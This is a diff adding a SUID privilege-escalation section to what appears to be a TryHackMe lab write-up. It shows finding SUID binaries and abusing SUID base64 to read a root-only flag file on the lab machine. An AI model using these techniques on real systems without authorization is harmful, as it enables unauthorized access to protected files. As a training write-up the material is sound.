@@ -91,3 +91,53 @@ THM-X
 Because find is executed with sudo, the spawned shell runs with root privileges, allowing us to access restricted files and fully compromise the system.
 
 Misconfigured sudo permissions are one of the most common and easiest privilege escalation vectors in Linux systems.
+
+# Privilege Escalation: SUID
+
+If we don’t have permission to use sudo -l, we can look for SUID binaries instead.
+To do that, we can use the following command:
+
+```
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+SUID (Set User ID) is a special permission bit in Unix/Linux systems that makes a program run with the file owner’s privileges instead of the privileges of the user who launched it.
+
+First, we confirm that sudo cannot be used:
+
+```
+$ sudo -l
+[sudo] password for karen: 
+Sorry, user karen may not run sudo on ip-10-65-154-239.
+```
+
+Now we search for SUID binaries:
+
+```
+$ find / -type f -perm -04000 -ls 2>/dev/null
+...
+/usr/bin/base64
+/usr/bin/su
+/usr/bin/mount
+...
+```
+
+Among the listed binaries, we can see that /usr/bin/base64 has the SUID bit set.
+
+After checking GTFOBins, we can confirm that base64 can be abused to read files with elevated privileges when it has the SUID bit set.
+
+Let’s test access to the restricted file:
+
+```
+$ cat /home/ubuntu/flag3.txt
+cat: /home/ubuntu/flag3.txt: Permission denied
+```
+
+Direct reading is not allowed. However, since base64 runs with root privileges (due to SUID), we can use it to read and decode the file:
+
+```
+$ base64 /home/ubuntu/flag3.txt | base64 --decode
+THM-X
+```
+
+Because the binary executes with the file owner's privileges (root), it allows us to read files that are normally inaccessible.
